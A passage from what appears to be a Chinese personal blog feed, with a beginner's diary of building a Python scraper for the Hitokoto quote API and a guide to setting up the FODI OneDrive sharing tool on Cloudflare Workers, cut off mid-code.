class="string">&quot;Myself&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> data[<span class="string">&quot;type&quot;</span>]== <span class="string">&quot;f&quot;</span>: sorts=(<span class="string">&quot;Internet&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> data[<span class="string">&quot;type&quot;</span>]== <span class="string">&quot;g&quot;</span>: sorts=(<span class="string">&quot;Other&quot;</span>)</span><br><span class="line">    temp=[data[<span class="string">&quot;id&quot;</span>],sorts,data[<span class="string">&quot;hitokoto&quot;</span>]]</span><br><span class="line">    <span class="built_in">print</span>(res.text)</span><br><span class="line">    append_csv(path)</span><br></pre></td></tr></table></figure><p>接着就会发现，运行着运行着，告诉我数组越限了？！！！</p><img src="https://cdn.jsdelivr.net/gh/NotFoundNEKKO/BQBTwT@1.0.0/害怕.jpg" width="186" height="302"><p>这个问题就真的很烦，因为C++是允许数组越限的，但是python不允许，会直接冷不丁给你报错，所以每次遇到这个问题我都不是很想去理它，但是不理它我的程序就运行不下去了啊！！！所以我先把检测重复这一段注释掉了，合上垃圾Lenovo，睡觉！</p><hr><h3 id="2020年2月12日-星期三-天气：下雨了啊！"><a href="#2020年2月12日-星期三-天气：下雨了啊！" class="headerlink" title="2020年2月12日 星期三 天气：下雨了啊！"></a>2020年2月12日 星期三 天气：下雨了啊！</h3><p>今天早上上课上到11点20分，开始写代码，用一中午想把这个重复检测的功能写完……</p><img src="https://cdn.jsdelivr.net/gh/NotFoundNEKKO/BQBTwT@1.0.0/大佬带我.jpg" width="360" height="344.5"><p>想到昨天的数组越限就头疼，我打算放弃这个方法，不存列表了！</p><p>我记得当时在华工有用过像<code>array[t]</code>这样的东西，于是我想起了一个利器——array数组！</p><p>新的思路是这样的：将得到的数据存入数组名为temp，开始先初始化这个变量：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> array <span class="keyword">import</span> array</span><br><span class="line">temp = array[<span class="string">&#x27;i&#x27;</span>,[<span class="number">0</span>]]</span><br></pre></td></tr></table></figure><p>至于我为什么在里面写一个0，是因为我发现我不这么做的话他会给我报错……</p><p>这样就初始化了一个名为temp类型为int的数组，里面含有一个元素0。然后在下面每次获取完id以后就将其存入temp变量</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">temp.append(data[<span class="string">&quot;id&quot;</span>])</span><br></pre></td></tr></table></figure><p>通过这样，每次再遍历temp里面的东西，只要重复，就说明抓过，没重复就说明没抓过，就可以达到去掉重复的效果！</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(num):</span><br><span class="line">    time.sleep(delay)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;正在获取新的一言……&quot;</span>)</span><br><span class="line">    res = r.get(<span class="string">&#x27;https://international.v1.hitokoto.cn/&#x27;</span>,timeout=<span class="number">60</span>) </span><br><span class="line">    <span class="comment"># 得到服务器回应，此时回应的内容为json文件（res.text）和状态码</span></span><br><span class="line">    data=res.json() <span class="comment"># 将获取到的结果转为json字符串</span></span><br><span class="line">    temp_minus=temp.count-<span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> temp_minus!=<span class="number">0</span>:</span><br><span class="line">        t=<span class="number">1</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;正在检测是否抓取过结果……&quot;</span>)</span><br><span class="line">        <span class="keyword">for</span> t <span class="keyword">in</span> <span class="built_in">range</span>(temp.count):</span><br><span class="line">            <span class="keyword">if</span>(<span class="built_in">int</span>(data[<span class="string">&quot;id&quot;</span>])==temp[t]):</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;发现已经抓取到的结果，正在丢弃……&quot;</span>)</span><br><span class="line">                i=i-<span class="number">1</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">elif</span>(t==temp.count-<span class="number">1</span>):</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;未抓取过的结果，正在存入文件……&quot;</span>)</span><br><span class="line">                <span class="keyword">if</span> data[<span class="string">&quot;type&quot;</span>]== <span class="string">&quot;a&quot;</span>: sorts=(<span class="string">&quot;Anime&quot;</span>)  <span class="comment"># 自动把分类码还原为分类</span></span><br><span class="line">                <span class="keyword">if</span> data[<span class="string">&quot;type&quot;</span>]== <span class="string">&quot;b&quot;</span>: sorts=(<span class="string">&quot;Comic&quot;</span>)</span><br><span class="line">                <span class="keyword">if</span> data[<span class="string">&quot;type&quot;</span>]== <span class="string">&quot;c&quot;</span>: sorts=(<span class="string">&quot;Game&quot;</span>)</span><br><span class="line">                <span class="keyword">if</span> data[<span class="string">&quot;type&quot;</span>]== <span class="string">&quot;d&quot;</span>: sorts=(<span class="string">&quot;Novel&quot;</span>)</span><br><span class="line">                <span class="keyword">if</span> data[<span class="string">&quot;type&quot;</span>]== <span class="string">&quot;e&quot;</span>: sorts=(<span class="string">&quot;Myself&quot;</span>)</span><br><span class="line">                <span class="keyword">if</span> data[<span class="string">&quot;type&quot;</span>]== <span class="string">&quot;f&quot;</span>: sorts=(<span class="string">&quot;Internet&quot;</span>)</span><br><span class="line">                <span class="keyword">if</span> data[<span class="string">&quot;type&quot;</span>]== <span class="string">&quot;g&quot;</span>: sorts=(<span class="string">&quot;Other&quot;</span>)</span><br><span class="line">                inputs=[data[<span class="string">&quot;id&quot;</span>],sorts,data[<span class="string">&quot;hitokoto&quot;</span>]]</span><br><span class="line">                <span class="comment"># print(res.text)   # 输出一言，如需要把最前面的#去掉即可</span></span><br><span class="line">                append_csv(path)</span><br><span class="line">                temp.append(data[<span class="string">&quot;id&quot;</span>])</span><br><span class="line">                end_Pro=datetime.datetime.now()</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;已完成数量：&quot;</span>+<span class="built_in">str</span>(i+<span class="number">1</span>)+<span class="string">&#x27;，已经用时：&#x27;</span>+<span class="built_in">str</span>(end_Pro-start_Pro))</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> data[<span class="string">&quot;type&quot;</span>]== <span class="string">&quot;a&quot;</span>: sorts=(<span class="string">&quot;Anime&quot;</span>)  <span class="comment"># 自动把分类码还原为分类</span></span><br><span class="line">        <span class="keyword">if</span> data[<span class="string">&quot;type&quot;</span>]== <span class="string">&quot;b&quot;</span>: sorts=(<span class="string">&quot;Comic&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> data[<span class="string">&quot;type&quot;</span>]== <span class="string">&quot;c&quot;</span>: sorts=(<span class="string">&quot;Game&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> data[<span class="string">&quot;type&quot;</span>]== <span class="string">&quot;d&quot;</span>: sorts=(<span class="string">&quot;Novel&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> data[<span class="string">&quot;type&quot;</span>]== <span class="string">&quot;e&quot;</span>: sorts=(<span class="string">&quot;Myself&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> data[<span class="string">&quot;type&quot;</span>]== <span class="string">&quot;f&quot;</span>: sorts=(<span class="string">&quot;Internet&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> data[<span class="string">&quot;type&quot;</span>]== <span class="string">&quot;g&quot;</span>: sorts=(<span class="string">&quot;Other&quot;</span>)</span><br><span class="line">        inputs=[data[<span class="string">&quot;id&quot;</span>],sorts,data[<span class="string">&quot;hitokoto&quot;</span>]]</span><br><span class="line">        <span class="comment"># print(res.text) # 输出一言，如需要把最前面的#去掉即可</span></span><br><span class="line">        append_csv(path)</span><br><span class="line">        temp.append(data[<span class="string">&quot;id&quot;</span>])</span><br><span class="line">        end_Pro=datetime.datetime.now()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;已完成数量：&quot;</span>+<span class="built_in">str</span>(i+<span class="number">1</span>)+<span class="string">&#x27;，已经用时：&#x27;</span>+<span class="built_in">str</span>(end_Pro-start_Pro))</span><br></pre></td></tr></table></figure><p>最后写出来的效果是这样子的，然后问题又出来了，我的temp.count似乎不能被它正确识别出来，于是我打开了一个新的文档，测试一下这个玩意输出长什么样子：</p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/Hitokoto-spider/Output3.png" alt="Output3"></p><p>emmmm，这是啥？？？</p><img src="https://cdn.jsdelivr.net/gh/NotFoundNEKKO/BQBTwT@1.0.0/害怕崩坏限定.jpg" width="428" height="345.5"><p>然后我又去求助万能的百度，网友们告诉我可以用len(temp)来获得数组的元素个数，然后我就把这玩意改了，终于可以运行了！！！接着问题又来了。。。</p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/Hitokoto-spider/Output4.png" alt="Output4"></p><p>这是？？？这怎么不连续啊，这数字？？？我想到可能是抓到重复的时候算抓了，就导致了i+1（不过这次测试挺非的，这么多次一样。。。非到极致也是一种欧！）</p><p>后来我试试加一个<code>i=i-1</code>在相应位置，结果还是不行，我就想到可能是局部变量改不动？？？</p><p>我就自己定义一个变量，用while循环呗……然后我就改用while循环</p><p>这下终于可以了，抓到的结果没有抓到重复的（因为中途连接超时导致程序停止运行了，所以只抓了2159条，本来是想把整个一言库抓完的，<a href="https://cdn.bili33.top/gh/Vikutorika/assets@master/files/Hitokoto-Spider/Hitokoto.csv">点我下载2159条数据，请用UTF8解码后保存为gbk才能在Excel上查看哦</a>）</p><p>终于搞定啦！！！这个项目终于能够按照期望运行了！</p><p>接下来要解决的问题：</p><ul><li><input disabled="" type="checkbox"> json配置文件支持</li><li><input disabled="" type="checkbox"> GUI支持</li></ul><hr><h3 id="题外话："><a href="#题外话：" class="headerlink" title="题外话："></a>题外话：</h3><p>这是我第一次做爬虫，把学到的python技术用出来。项目已经上传到<a href="https://github.com/GamerNoTitle/Hitokoto-Spider">https://github.com/GamerNoTitle/Hitokoto-Spider</a></p><p>有人愿意与我一起做项目我也非常开心，希望大家能够活用此项目，不要再用什么八爪鱼抓一言了，那种要VIP的软件对我们这种程序员来说一点也不友好，还不如自己来……</p><hr><h3 id="2020年2月16日-星期日-天气：还是下雨天……"><a href="#2020年2月16日-星期日-天气：还是下雨天……" class="headerlink" title="2020年2月16日 星期日 天气：还是下雨天……"></a>2020年2月16日 星期日 天气：还是下雨天……</h3><p>今天晚上，我对爬虫进行了优化，之前我上面就说过要提供json配置文件的支持，今天的目标就是这个！走起！</p><p>首先，要新建一个json文件，里面包含的参数如下：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;path&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Hitokoto.csv&quot;</span><span class="punctuation">,</span><span class="comment">//文件输出路径</span></span><br><span class="line">    <span class="attr">&quot;times&quot;</span><span class="punctuation">:</span> <span class="number">3</span><span class="punctuation">,</span><span class="comment">// 抓取次数</span></span><br><span class="line">    <span class="attr">&quot;delay&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span><span class="comment">// 抓取延迟，针对一言的QPS设置</span></span><br><span class="line">    <span class="attr">&quot;timeout&quot;</span><span class="punctuation">:</span> <span class="number">60</span><span class="punctuation">,</span><span class="comment">// 连接超时时间（单位：秒）</span></span><br><span class="line">    <span class="attr">&quot;from&quot;</span><span class="punctuation">:</span> <span class="keyword">false</span><span class="punctuation">,</span><span class="comment">// 来自什么作品</span></span><br><span class="line">    <span class="attr">&quot;from_who&quot;</span><span class="punctuation">:</span> <span class="keyword">false</span><span class="punctuation">,</span><span class="comment">// 来自谁</span></span><br><span class="line">    <span class="attr">&quot;creator&quot;</span><span class="punctuation">:</span> <span class="keyword">false</span><span class="punctuation">,</span><span class="comment">// 哪位用户提交的</span></span><br><span class="line">    <span class="attr">&quot;created_at&quot;</span><span class="punctuation">:</span> <span class="keyword">false</span><span class="comment">// 何时提交</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>其中，文件输出路径是str变量，抓取次数、抓取延迟、抓取超时都是int变量，from、from_who、creator、created_at都是bool型变量，这就表示它只支持true和false</p><p>搞定config文件的内容后，反过来对代码进行添加，定义一个读取json文件的函数，命名为read_config()</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">read_config</span>():</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;config.json&quot;</span>) <span class="keyword">as</span> json_file:</span><br><span class="line">        config = js.load(json_file)</span><br><span class="line">    <span class="keyword">return</span> config</span><br></pre></td></tr></table></figure><p>这样，我使用conf &#x3D; read_config()就可以获得文件中的所有内容，文件读出来的结果应该是这样的（如图）</p><p><img src="https://cdn.jsdelivr.net/gh/GamerNoTitle/Picture-repo-v1@2020.2.17-1/img/Hitokoto-Spider/json_read.png" alt="json read"></p><p>把程序再美化一下，运行后发现，出了BUG</p><p><img src="https://cdn.jsdelivr.net/gh/GamerNoTitle/Picture-repo-v1@2020.2.17/img/Hitokoto-Spider/from_who_bug.png" alt="from_who KeyError"></p><p>KeyError？？？WTF？？？你不是能正常读入的呢嘛？这又是个什么鬼错误……</p><p>上网搜索说是读不到相关的东西，不在字典中，我就想在上面提前置顶from_who的值，但是一言返回的结果里面的东西我也修改不了啊……所以还是要解决KeyError的问题</p><p>上网一搜，全部都是用dict导致的问题。我寻思：我怎么也没有操作字典吧。。。</p><p>算了，先上传吧，明天再修复from_who的BUG……</p><p>我的友人表示想建立一个一言的镜像站，所以要求我把其他的参数给加上，我先加吧……</p><p>尴尬……又出现了KeyError的问题，这次是creator_uid和reviewer，算了明天弄吧……睡觉！</p><h3 id="2020年2月17日-星期一-天气：晴天"><a href="#2020年2月17日-星期一-天气：晴天" class="headerlink" title="2020年2月17日 星期一 天气：晴天"></a>2020年2月17日 星期一 天气：晴天</h3><p>今天早上起来，换了台电脑，还是有keyerror的错误，然后去问了一下大学导师，他告诉我是data里面没有这个key的项的问题，然后我又倒回去看发现，上面提到的三个数值有些结果是没有使用双引号括起来的，基本都写的null或者是0，这样就导致data里面没有这个key，进而导致keyerror</p><p>所以我是打算用try和except这两个东西进行解决。</p><p>在代码里稍作修改，加入try和except</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(conf[<span class="string">&quot;from_who&quot;</span>] == <span class="literal">True</span>): </span><br><span class="line"><span class="keyword">try</span>: inputs.append(data[<span class="string">&quot;from_who&quot;</span>])</span><br><span class="line">    <span class="keyword">except</span> KeyError: inputs.append(<span class="string">&quot;null&quot;</span>)</span><br></pre></td></tr></table></figure><p>在会报KeyError错误的地方都进行这样的修改，然后进行调试</p><p><img src="https://cdn.jsdelivr.net/gh/GamerNoTitle/Picture-repo-v1@2020.2.17-1/img/Hitokoto-Spider/KeyError-Fixed.png" alt="KeyError Fixed"></p><p>终于可以啦！！！推送代码，项目完成！</p><p>接下来就是要加入GUI支持了，但是我其实不是很会做GUI，所以说别抱太大希望，很有可能鸽掉……</p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/Diary/Gugugu.jpg" alt="白咕咕"></p>]]></content>
      
      
      <categories>
          
          <category> Tech </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Tech </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Onedrive分享型网盘搭建 - FODI</title>
      <link href="/posts/FODI/"/>
      <url>/posts/FODI/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>本人有两个onedrive账号，一个自用，另外一个是<a href="http://bili33.top/2019/08/30/Office365/#%E9%A2%98%E5%A4%96%E8%AF%9D%EF%BC%9A">前几天蹭的edu账号</a>，之前一直想用onedrive来分享文件（毕竟容量是真的大），就在放寒假前，我发现了github的一个项目：<a href="https://github.com/vcheckzen/FODI">FODI</a>，虽说这UI不是很好看，但是不用服务器（嗯，让白嫖党有点快乐了），所以就动起了手……</p><p>官方教程：<a href="https://logi.im/front-end/scf-fodi.html">https://logi.im/front-end/scf-fodi.html</a></p><p>当我正在按照官方教程搭建的时候，在获取refresh_token这一步，它居然给我报错了？？？</p><p>官方教程中，是要求进入<a href="https://service-36wivxsc-1256127833.ap-hongkong.apigateway.myqcloud.com/release/scf_onedrive_filelistor">此网址</a>进行登录后，把第一个<code>?</code>删掉，把第一个<code>&amp;</code>改成<code>?</code>，然后就给我弹出以下错误：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Message</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;error&quot;</span>: <span class="string">&quot;invalid_grant&quot;</span>,</span><br><span class="line">    <span class="string">&quot;error_description&quot;</span>: <span class="string">&quot;AADSTS54005: OAuth2 Authorization code was already redeemed, please retry with a new valid code or use an existing refresh token.\r\nTrace ID: b0425d60-48d1-4006-aec5-76d97732cd00\r\nCorrelation ID: 0d390346-7cfa-4284-9518-67444dca1511\r\nTimestamp: 2020-02-09 02:08:21Z&quot;</span>,</span><br><span class="line">    <span class="string">&quot;error_codes&quot;</span>: [</span><br><span class="line">        <span class="number">54005</span></span><br><span class="line">    ],</span><br><span class="line">    <span class="string">&quot;timestamp&quot;</span>: <span class="string">&quot;2020-02-09 02:08:21Z&quot;</span>,</span><br><span class="line">    <span class="string">&quot;trace_id&quot;</span>: <span class="string">&quot;b0425d60-48d1-4006-aec5-76d97732cd00&quot;</span>,</span><br><span class="line">    <span class="string">&quot;correlation_id&quot;</span>: <span class="string">&quot;0d390346-7cfa-4284-9518-67444dca1511&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我的内心是崩溃的……好了不干了！</p><p><img src="https://cdn.bili33.top/NotFoundNEKKO/Storage/master/%E8%A1%A8%E6%83%85%E5%8C%85/%E5%92%95%E5%92%95%E5%92%95.jpg" alt="咕咕咕"></p><hr><p>回归正题，干还是要干的，要么握着5T的onedrive没意思是吧……</p><p>然后我在Github又发现了一个新的项目——<a href="https://github.com/qkqpttgf/OneManager-php">OneManager</a></p><p><img src="https://cdn.bili33.top/NotFoundNEKKO/Storage/master/%E8%A1%A8%E6%83%85%E5%8C%85/%E5%88%9D%E9%9F%B3%E5%98%A4%E5%98%A4%E5%98%A4.jpg" alt="嘤嘤嘤"></p><p>打算部署这个玩意，这时候就有人问了：诶不是，你这标题不是写的FODI？怎么变成OneManager了？</p><p>别急，这玩意自然有它利用的价值</p><p><img src="https://camo.githubusercontent.com/83b0e95b38892b49184e07ad572c94c8038323fb/68747470733a2f2f7777772e6865726f6b7563646e2e636f6d2f6465706c6f792f627574746f6e2e737667" alt="Deploy" data-canonical-src="https://www.herokucdn.com/deploy/button.svg" style="max-width:100%;">点击这个紫色的按钮，就会进入heroku的部署界面<del>（啥？你说你不会用？那没事了）</del>，将此项目部署后进行安装，会要求输入heroku的api和管理员密码，这些就按要求填写就好了</p><p>接着就到了比较重要的一步：获取refresh_token（没错你知道我要干嘛了）</p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/FODI/Onemanager-Step1.png" alt="版本选择"></p><p>第一步安装的时候选择MS（中国版选择CN，如果你喜欢搞事情，你也可以选择MSC自己申请api，我就是懒，就不自己申请api了）</p><p>然后登陆自己的微软账户，接着就会弹出自己的refresh_token，这不就搞定了refresh_token啦？！</p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/FODI/refresh-token-in-install.png" alt="refresh_token获取"></p><p>如果你没有及时复制你自己的refresh_token，你也可以到你自己heroku项目的变量下复制</p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/FODI/refresh-token-heroku.png" alt="refresh_token in Heroku"></p><p>接着我们返回FODI，将自己的refresh_token贴近官方给的<a href="https://github.com/vcheckzen/FODI/blob/master/back-end-cf/index.js">模板</a>的对应位置，接着将代码复制到cloudflare的workers里面（你又问我workers是什么？看<a href="/2019/10/25/CloudFlare-Workers-Section1/">这里</a>啦！），然后保存即可！</p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/FODI/workers-editor.png" alt="cloudflare editor"></p><p>官方模板：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * IS_CN: 如果为世纪互联版本，请将 0 改为 1</span></span><br><span class="line"><span class="comment"> * EXPOSE_PATH：暴露路径，如全盘展示请留空，否则按 &#x27;/媒体/音乐&#x27; 的格式填写</span></span><br><span class="line"><span class="comment"> * ONEDRIVE_REFRESHTOKEN: refresh_token</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">IS_CN</span> = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">EXPOSE_PATH</span> = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">ONEDRIVE_REFRESHTOKEN</span> = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">handleRequest</span>(<span class="params">request</span>) &#123;</span><br><span class="line">  <span class="keyword">let</span> requestPath</span><br><span class="line">  <span class="keyword">let</span> querySplited</span><br><span class="line">  <span class="keyword">let</span> queryString = request.<span class="property">url</span>.<span class="title function_">split</span>(<span class="string">&#x27;?&#x27;</span>)[<span class="number">1</span>]</span><br><span class="line">  <span class="keyword">if</span> (queryString) &#123;</span><br><span class="line">    querySplited = queryString.<span class="title function_">split</span>(<span class="string">&#x27;=&#x27;</span>)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (querySplited &amp;&amp; querySplited[<span class="number">0</span>] === <span class="string">&#x27;file&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> file = querySplited[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">const</span> fileName = file.<span class="title function_">split</span>(<span class="string">&#x27;/&#x27;</span>).<span class="title function_">pop</span>();</span><br><span class="line">    requestPath = file.<span class="title function_">replace</span>(<span class="string">&#x27;/&#x27;</span> + fileName, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">const</span> url = <span class="keyword">await</span> <span class="title function_">fetchFiles</span>(requestPath, fileName)</span><br><span class="line">    <span class="keyword">return</span> <span class="title class_">Response</span>.<span class="title function_">redirect</span>(url, <span class="number">302</span>)</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> &#123; headers &#125; = request</span><br><span class="line">    <span class="keyword">const</span> contentType = headers.<span class="title function_">get</span>(<span class="string">&#x27;content-type&#x27;</span>)</span><br><span class="line">    <span class="keyword">let</span> body=&#123;&#125;</span><br><span class="line">    <span class="keyword">if</span> (contentType &amp;&amp; contentType.<span class="title function_">includes</span>(<span class="string">&#x27;form&#x27;</span>)) &#123;</span><br><span class="line">      <span class="keyword">const</span> formData = <span class="keyword">await</span> request.<span class="title function_">formData</span>()</span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">let</span> entry <span class="keyword">of</span> formData.<span class="title function_">entries</span>()) &#123;</span><br><span class="line">        body[entry[<span class="number">0</span>]] = entry[<span class="number">1</span>]</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    requestPath = body ? 